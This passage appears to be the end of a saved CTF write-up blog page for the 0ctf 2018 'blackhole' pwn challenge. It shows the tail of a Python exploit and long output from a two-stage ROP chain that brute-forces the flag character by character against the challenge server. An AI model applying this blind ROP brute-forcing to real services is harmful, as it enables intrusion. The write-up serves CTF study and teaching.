+        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">testch</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">"Found: </span><span class="si">%s</span><span class="s">"</span> <span class="o">%</span> <span class="n">result</span>
+
+    <span class="k">return</span> <span class="n">result</span></code></pre></div>
+
+<p>This will need 8 connections per character to find the correct character (and it has to solve the proof of work every time, so it will take even more <em>sigh</em>). So, grab a coffee, since this will take quite some time until the flag is finally found, but it will work out in the end :)</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">$ python blackhole.py 1
+[*] '/home/kileak/pwn/Challenges/0ctf18/pwn/blackhole/blackhole'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Closed connection to 202.120.7.203 port 666
+Test: @
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: `
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: p
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: h
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: d
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: f
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: g
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: f
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Closed connection to 202.120.7.203 port 666
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Found: f
+Test: @
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: `
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: p
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: h
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: l
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: n
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: m
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Test: l
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Found: fl
+Test: @
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Closed connection to 202.120.7.203 port 666
+
+[SNIP]
+
+[*] Solve pow
+[+] Opening connection to 202.120.7.203 on port 666: Done
+[*] Stage1: Prepare bigger ropchain (on bss)
+[*] Stage2: Send second ropchain (known address)
+[*] Closed connection to 202.120.7.203 port 666
+Found: flag{even_black_holes_leak_information_by_Hawking_radiation}
+
+...</code></pre></div>
+
+<p>That took some time, so I’m quite curious, if someone comes up with a more elegant and quicker method of getting the flag out of this, but well, a flag is a flag :)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=0ctf%202018%20quals%20-%20blackhole&amp;url=https://kileak.github.io/ctf/2018/0ctf-qual-blackhole/" onclick="window.open(this.href, &#39;twitter-share&#39;, &#39;width=550,height=235&#39;);return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/0ctf-qual-blackhole/" onclick="window.open(this.href, &#39;facebook-share&#39;,&#39;width=580,height=296&#39;);return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+    
+  <aside id="comments" class="disqus">      
+    <div class="container">      
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/0ctf-qual-blackhole';
+        var disqus_title = '0ctf 2018 quals - blackhole';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/0ctf-qual-blackhole';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the &lt;a href="https://disqus.com/?ref_noscript" rel="nofollow"&gt;comments powered by Disqus.&lt;/a&gt;
+      </noscript>    
+    </div>   
+  </aside>
+
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>© 2018 All rights reserved. Made with <a href="http://jekyllrb.com/" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me/" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="./0ctf 2018 quals - blackhole _ kileak_files/jquery.min.js.下载"></script>
+    <script src="./0ctf 2018 quals - blackhole _ kileak_files/jekyll-search.min.js.下载"></script>
+    <script src="./0ctf 2018 quals - blackhole _ kileak_files/main.js.下载"></script>
+  
+
+</body></html>
